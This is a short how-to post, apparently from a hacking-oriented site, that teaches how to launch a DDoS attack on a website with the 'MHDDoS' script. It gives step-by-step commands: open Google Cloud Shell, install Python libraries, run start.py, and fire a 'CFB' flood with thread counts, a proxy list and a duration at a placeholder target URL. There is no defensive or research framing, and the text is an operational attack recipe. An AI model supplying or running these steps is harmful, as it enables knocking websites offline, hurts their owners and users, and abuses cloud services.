How to make a DDoS attack on a website?

Introducing The MHDDoS!

DDoS Attack Script With 36 Methods. 

1. Go to the site

https://shell.cloud.google.com/

In this window, we will write several commands:


ls

cd MHDDoS

pip3 install icmplib requests pysocks cfscrape scapy

python3    start.py

All possible DDoS methods will be given here.

To start DDoS, enter the command:

python3   start.py   CFB   https://Hackfreaks.cim( site link)   1 1000   http.txt   1000 1000
